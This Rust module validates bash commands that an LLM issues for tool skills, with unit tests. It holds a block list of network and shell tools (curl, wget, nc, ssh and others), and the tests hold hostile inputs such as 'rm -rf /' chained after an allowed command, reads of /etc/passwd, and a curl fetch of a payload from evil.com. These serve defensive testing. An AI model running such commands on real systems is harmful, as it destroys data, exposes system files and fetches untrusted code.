//! Bash command validator for bash-tool skills.
//!
//! This module provides security validation for bash commands issued by LLMs
//! when executing bash-tool skills (e.g. `agent-browser`). All validation runs
//! in compiled Rust code and cannot be bypassed from the Python SDK layer.
//!
//! ## Security Layers
//!
//! 1. **Chain operator detection** — blocks `;`, `&&`, `||`, `|`, backticks,
//!    `$(...)`, `${...}`, newlines, and other injection vectors.
//! 2. **Allowed prefix matching** — command must start with one of the
//!    `allowed-tools: Bash(prefix:*)` patterns declared in SKILL.md.
//! 3. **Blocked prefix check** — dangerous commands (rm, sudo, sh, curl, etc.)
//!    are always rejected regardless of allowed patterns.

use thiserror::Error;

/// Parsed pattern from `allowed-tools: Bash(prefix:*)`.
///
/// Defined locally so that the sandbox module does not depend on `skill::metadata`.
/// Callers convert from `skill::metadata::BashToolPattern` at the call site.
#[derive(Debug, Clone)]
pub struct BashToolPattern {
    /// Command prefix, e.g. "agent-browser"
    pub command_prefix: String,
    /// Raw pattern string, e.g. "agent-browser:*"
    pub raw_pattern: String,
}

/// Errors returned by bash command validation.
#[derive(Debug, Error)]
pub enum BashValidationError {
    #[error("Command contains chain operator '{0}' — potential injection")]
    ChainOperator(String),

    #[error("Command '{cmd}' does not match any allowed pattern (allowed: {allowed})")]
    NoMatchingPattern { cmd: String, allowed: String },

    #[error("Command starts with blocked prefix '{0}'")]
    BlockedPrefix(String),

    #[error("Empty command")]
    EmptyCommand,
}

/// Operators that could chain multiple commands together.
/// We treat their presence anywhere in the command string as an injection attempt.
const CHAIN_OPERATORS: &[&str] = &[
    ";", "&&", "||", "|", "`", "$(", "${", "\n", "\r",
    // Redirect-based attacks
    ">(",
];

/// Command prefixes that are always blocked, regardless of `allowed-tools`.
const BLOCKED_PREFIXES: &[&str] = &[
    "rm",
    "sudo",
    "su",
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "curl",
    "wget",
    "chmod",
    "chown",
    "chgrp",
    "mkfs",
    "dd",
    "kill",
    "killall",
    "pkill",
    "reboot",
    "shutdown",
    "halt",
    "poweroff",
    "mount",
    "umount",
    "fdisk",
    "nc",
    "ncat",
    "netcat",
    "ssh",
    "scp",
    "rsync",
    "eval",
    "exec",
    "source",
    "env",
    "nohup",
    "xargs",
    "osascript",
];

/// Validate a bash command against the allowed patterns from SKILL.md.
///
/// Returns `Ok(())` if the command passes all checks, or a descriptive error
/// explaining why the command was rejected.
///
/// # Arguments
///
/// * `cmd` — The raw bash command string from the LLM.
/// * `allowed_patterns` — Parsed `BashToolPattern` items from `allowed-tools`.
pub fn validate_bash_command(
    cmd: &str,
    allowed_patterns: &[BashToolPattern],
) -> Result<(), BashValidationError> {
    let trimmed = cmd.trim();

    // 0. Reject empty commands
    if trimmed.is_empty() {
        return Err(BashValidationError::EmptyCommand);
    }

    // 1. Check for chain operators (injection prevention)
    for op in CHAIN_OPERATORS {
        if trimmed.contains(op) {
            return Err(BashValidationError::ChainOperator(op.to_string()));
        }
    }

    // 2. Check against blocked prefixes
    //    We extract the first "word" (space-delimited) and compare.
    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    for blocked in BLOCKED_PREFIXES {
        if first_word == *blocked {
            return Err(BashValidationError::BlockedPrefix(blocked.to_string()));
        }
        // Also block absolute paths to blocked commands (e.g. /bin/rm, /usr/bin/sudo)
        if first_word.ends_with(&format!("/{}", blocked)) {
            return Err(BashValidationError::BlockedPrefix(
                first_word.to_string(),
            ));
        }
    }

    // 3. Must match at least one allowed pattern's command prefix
    let matches_pattern = allowed_patterns.iter().any(|pattern| {
        trimmed.starts_with(&pattern.command_prefix)
    });

    if !matches_pattern {
        let allowed = allowed_patterns
            .iter()
            .map(|p| p.raw_pattern.as_str())
            .collect::<Vec<_>>()
            .join(", ");
        return Err(BashValidationError::NoMatchingPattern {
            cmd: trimmed.chars().take(80).collect(),
            allowed,
        });
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn agent_browser_patterns() -> Vec<BashToolPattern> {
        vec![BashToolPattern {
            command_prefix: "agent-browser".to_string(),
            raw_pattern: "agent-browser:*".to_string(),
        }]
    }

    fn multi_patterns() -> Vec<BashToolPattern> {
        vec![
            BashToolPattern {
                command_prefix: "agent-browser".to_string(),
                raw_pattern: "agent-browser:*".to_string(),
            },
            BashToolPattern {
                command_prefix: "mycli".to_string(),
                raw_pattern: "mycli:*".to_string(),
            },
        ]
    }

    // ---- Valid commands ----

    #[test]
    fn test_valid_command() {
        let patterns = agent_browser_patterns();
        assert!(validate_bash_command("agent-browser open https://example.com", &patterns).is_ok());
    }

    #[test]
    fn test_valid_command_with_args() {
        let patterns = agent_browser_patterns();
        assert!(validate_bash_command("agent-browser screenshot --path page.png", &patterns).is_ok());
    }

    #[test]
    fn test_valid_command_multi_pattern() {
        let patterns = multi_patterns();
        assert!(validate_bash_command("mycli do-something", &patterns).is_ok());
        assert!(validate_bash_command("agent-browser open http://test.com", &patterns).is_ok());
    }

    // ---- Chain operator injection ----

    #[test]
    fn test_reject_semicolon() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open x.com; rm -rf /", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    #[test]
    fn test_reject_and_chain() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open x.com && rm -rf /", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    #[test]
    fn test_reject_pipe() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open x.com | cat /etc/passwd", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    #[test]
    fn test_reject_backtick() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open `whoami`.example.com", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    #[test]
    fn test_reject_dollar_paren() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open $(cat /etc/passwd)", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    #[test]
    fn test_reject_newline() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("agent-browser open x.com\nrm -rf /", &patterns);
        assert!(matches!(result, Err(BashValidationError::ChainOperator(_))));
    }

    // ---- Blocked prefixes ----

    #[test]
    fn test_reject_rm() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("rm -rf /", &patterns);
        assert!(matches!(result, Err(BashValidationError::BlockedPrefix(_))));
    }

    #[test]
    fn test_reject_sudo() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("sudo agent-browser open x.com", &patterns);
        assert!(matches!(result, Err(BashValidationError::BlockedPrefix(_))));
    }

    #[test]
    fn test_reject_absolute_path_rm() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("/bin/rm -rf /", &patterns);
        assert!(matches!(result, Err(BashValidationError::BlockedPrefix(_))));
    }

    #[test]
    fn test_reject_curl() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("curl https://evil.com/payload.sh", &patterns);
        assert!(matches!(result, Err(BashValidationError::BlockedPrefix(_))));
    }

    #[test]
    fn test_reject_bash_shell() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("bash -c 'echo hacked'", &patterns);
        assert!(matches!(result, Err(BashValidationError::BlockedPrefix(_))));
    }

    // ---- No matching pattern ----

    #[test]
    fn test_reject_unknown_command() {
        let patterns = agent_browser_patterns();
        let result = validate_bash_command("unknown-tool do-thing", &patterns);
        assert!(matches!(result, Err(BashValidationError::NoMatchingPattern { .. })));
        // Verify the error message includes the allowed patterns
        let err_msg = result.unwrap_err().to_string();
        assert!(err_msg.contains("agent-browser:*"), "error should show allowed patterns");
    }

    // ---- Edge cases ----

    #[test]
    fn test_reject_empty() {
        let patterns = agent_browser_patterns();
        assert!(matches!(
            validate_bash_command("", &patterns),
            Err(BashValidationError::EmptyCommand)
        ));
    }

    #[test]
    fn test_reject_whitespace_only() {
        let patterns = agent_browser_patterns();
        assert!(matches!(
            validate_bash_command("   ", &patterns),
            Err(BashValidationError::EmptyCommand)
        ));
    }

    #[test]
    fn test_valid_with_leading_spaces() {
        let patterns = agent_browser_patterns();
        assert!(validate_bash_command("  agent-browser open https://example.com", &patterns).is_ok());
    }
}
